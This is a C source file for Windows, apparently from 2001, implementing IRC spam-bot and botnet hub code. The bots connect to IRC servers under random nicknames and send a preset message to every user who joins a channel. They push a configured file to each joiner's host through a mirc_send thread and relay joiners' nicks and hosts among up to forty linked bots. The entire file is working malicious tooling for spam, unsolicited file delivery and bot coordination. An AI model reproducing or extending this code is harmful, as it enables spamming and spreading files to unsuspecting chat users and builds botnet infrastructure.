// static char *_CMSID = "$CmsFile: oj $ $Date:2001.5.10.2.22.34  $";

#include <windows.h>
#include <winsock.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <process.h>
#include "main.h"


extern char ojconn[500];
extern char *ojfile;
extern HWND hwnd;
extern char *ojmsg;
extern char *ojstain;
extern SOCKET ojsock;
extern int debug_on;
SOCKADDR_IN sockit;
LPHOSTENT lpHostEntry;
SOCKET oj_hub;            // a link to a hub
void oj_parse(char *, SOCKET);
SOCKET hub_sock[41];

char buffpong[100];
char buffq[1000];

// 5567
int ojcallback(SOCKET Csock, LPARAM lParam)    // The Spam bots call back
{
	extern SOCKET ojsock;
	SOCKADDR_IN cmm;
	int namelen = sizeof(cmm);
	char *ptr;
    int i;
	char tmpest[300];
	char randstg[20];
	memset(tmpest, 0, 300);
	memset(randstg,0,20);
	switch(lParam)
	{
	case FD_READ:
		ojsock = Csock;
		memset(buffq,0,1000);
		recv(Csock, buffq,1000,0);
		oj_parse(buffq,Csock);

		break;
	case FD_CLOSE:

		getpeername(ojsock,&cmm,&namelen);
		closesocket(ojsock);

		ojsock = socket( PF_INET, SOCK_STREAM, 0);
		WSAAsyncSelect(ojsock, hwnd , 5567,
		FD_CONNECT | FD_CLOSE | FD_READ);
		cmm.sin_port = htons(6667);
		cmm.sin_family = AF_INET;
		connect(ojsock, &cmm, sizeof(cmm));  //connect to irc server //
		ident();


		break;
	case FD_CONNECT:
		if(!HIWORD(lParam))
		{
			for (i = 0; i < 10; i++ )
			{
				char randchr[1];
				sprintf(randchr,"%c",(((rand()+26) %26) + 64));
				lstrcat(randstg,randchr);
				//strcat((char *) (((rand()+26) %26) + 64),&randstg);
			}

			sprintf(tmpest,"USER %s localhost localhost %s\r\nNICK %s\r\n",randstg,randstg,randstg);
			send(Csock,tmpest,lstrlen(tmpest),0);
			send(Csock,ojconn,lstrlen(ojconn),0);
		}
		else
		{
			closesocket(Csock);
		}

	}

	return 1;
}





void oj_parse(char *ins, SOCKET sockkz)
{
	char niqbuff[68];
	char hostbuff[100];
	char *lpstr1;
	int Qc;
	if(memcmp(ins,"PING",4) == 0)
	{
		ZeroMemory(buffpong,100);

		lstrcat(buffpong,"PONG :bleh\r\n");
   		send(sockkz,buffpong,lstrlen(buffpong),0);
		return;
	}

	ZeroMemory(niqbuff,68);
	ZeroMemory(hostbuff,100);
	lstrcat(niqbuff,strtok(ins,":! ")); // nick
	if(strtok(0,"~@")) //  get past the ident
	{
		lpstr1 = strtok(0,":~@ ");
		if(lpstr1)
		{
			lstrcat(hostbuff,lpstr1);

			lpstr1 = strtok(0," ");
			if(lpstr1)
			{
				if(strcmp("JOIN",lpstr1) == 0)
				{

#ifdef debugg
					if(debug_on)
					{
						char *joinz = malloc(300);
						ZeroMemory(joinz,300);
						sprintf(joinz,"(OJ): JOINS: %s!%s\r\n",niqbuff,hostbuff);
						log_debug(joinz);
						free(joinz);
					}
#endif
					ZeroMemory(buffq,1000);
					if(lstrlen(ojmsg) && (oj_hub == 0) )     //make sure it has something there and were not on a bot net
					{
						sprintf(buffq,"NOTICE %s :%s\r\n",niqbuff,ojmsg);
						send(sockkz, buffq,lstrlen(buffq),0);
					}
					if(lstrlen(ojfile))
					{
						sprintf(buffq,"%s %s %s",hostbuff, ojfile, ojstain);
						beginthread(&mirc_send, 256, buffq);
					}
					if(ojsock)
					{
						char jjs[200];
						sprintf(jjs,"i %s\r\n",hostbuff);
						send(oj_hub,jjs,lstrlen(jjs),0);

						sprintf(jjs,"n %s\r\n",niqbuff);
						send(oj_hub,jjs,lstrlen(jjs),0);
					}
				}
			}

		}
	}
	return;
}



// 5084
int link(SOCKET Csock, LPARAM lParam)      // our bot LINK call back
{

	switch(lParam)
	{
	case FD_READ:
		ZeroMemory(buffpong,100);
		recv(Csock, buffpong,100,0);
		if((int)buffpong[0] =='n') // n <nick>
		{
			ZeroMemory(buffq,1000);
			lstrcat(buffq,strtok((buffpong + 1)," \r\n"));
			if(lstrlen(ojmsg))
			{
				sprintf(buffpong,"PRIVMSG %s :%s\r\n",buffq, ojmsg);
				send(ojsock,buffpong,lstrlen(buffpong),0);
			}

#ifdef debugg
			if(debug_on)
			{
				char *tmpdd = malloc(300);
				ZeroMemory(tmpdd,300);
				sprintf(tmpdd,"(LINK): %s\r\n",buffq);
				log_debug(tmpdd);
			}

#endif


		}


		break;
	case FD_CLOSE:
		SendMessage(hwnd,8481,(WPARAM)"(link): FD_CLOSE",0);
		oj_hub = 0;

#ifdef debugg
		if(debug_on) log_debug("(LINK): lost link\r\n");
#endif

		closesocket(Csock);
		break;


	case FD_CONNECT:
		if(!HIWORD(lParam))
		{
			oj_hub = Csock;
#ifdef debugg
			if(debug_on) log_debug("(LINK): Connected!\r\n");
#endif
			SendMessage(hwnd,8481,(WPARAM)"(link): Connected",0);
		}
		else
		{
			closesocket(Csock);
			SendMessage(hwnd,8481,(WPARAM)"(link): Error!",0);
		}

	}

	return 1;
}




// HUB -- 5758 hub_sock
int hub( SOCKET Csock, LPARAM lparam)
{
	static char takn[] = "Sorry this ones taken!\r\n";
	int i;
	int erroq;


	switch(lparam)
	{
	case FD_READ:
		ZeroMemory(buffq,1000);
		recv(Csock, buffq, 1000, 0);

		for (i = 0; i < 40; i++)       //now we relay data to all other bots
		{
			if((hub_sock[i] != Csock) && (hub_sock[i] != 0))
			{
				erroq = send(hub_sock[i],buffq,lstrlen(buffq),0);  //send it out
				if(erroq == SOCKET_ERROR)
				{
					hub_sock[i] = 0;
					if(debug_on) log_debug("(HUB): Dead Socket\r\n");
					shutdown(hub_sock[i],2);
				}

			}
		}



		break;
	case FD_CLOSE:
		for (i = 0; i < 40; i++)
		{
			if(hub_sock[i] == Csock)
			{
				hub_sock[i] = (SOCKET) 0;
			}
		}

		closesocket(Csock);
		break;


	case FD_ACCEPT:
		for (i = 0; i < 40; i++)
		{
			if(hub_sock[i] == 0)
			{
				hub_sock[i] = accept(Csock, 0 , 0);
				return 1;
			}
		}
		send(Csock,takn,lstrlen(takn),0);
		closesocket(Csock);

	}
	return 1;
}



